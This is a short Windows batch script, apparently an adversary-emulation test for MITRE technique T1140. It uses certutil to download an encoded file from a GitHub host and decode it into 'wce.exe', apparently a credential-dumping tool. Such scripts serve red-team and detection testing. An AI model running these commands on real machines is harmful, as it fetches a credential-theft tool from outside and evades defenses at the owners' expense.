@ECHO OFF
CLS
color 0E


ECHO ===================================================================
ECHO Technique: Deobfuscate/Decode Files Or Information (T1140)
ECHO.
ECHO [+] Simulate 'Certutil' to Download and Decode a "WCE.exe" binary
ECHO -------------------------------------------------------------------
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/greycel/poc/master/wce.txt %temp%\APT19\wce.txt
certutil.exe  -decode %temp%\APT19\wce.txt %temp%\APT19\wce.exe
ECHO.



